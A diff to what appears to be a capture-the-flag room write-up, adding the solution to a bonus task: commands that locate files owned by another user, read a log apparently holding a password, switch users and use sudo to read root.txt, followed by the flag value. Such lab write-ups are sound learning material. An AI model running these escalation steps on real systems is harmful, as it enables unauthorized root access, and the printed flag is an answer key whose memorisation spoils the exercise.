@@ -211,4 +211,9 @@ test1234
 
 ## [Task 43] Bonus Challenge - The True Ending
 1. Finish this room off! What is the root.txt flag?
-    - 
+    - `find / -user shiba2 2>/dev/null`
+    - `su shiba2`
+    - `cat /var/log/test1234`
+    - `su nootnoot`
+    - `sudo cat /root/root.txt`
+    - ad91979868d06e19d8e8a9c28be56e0c
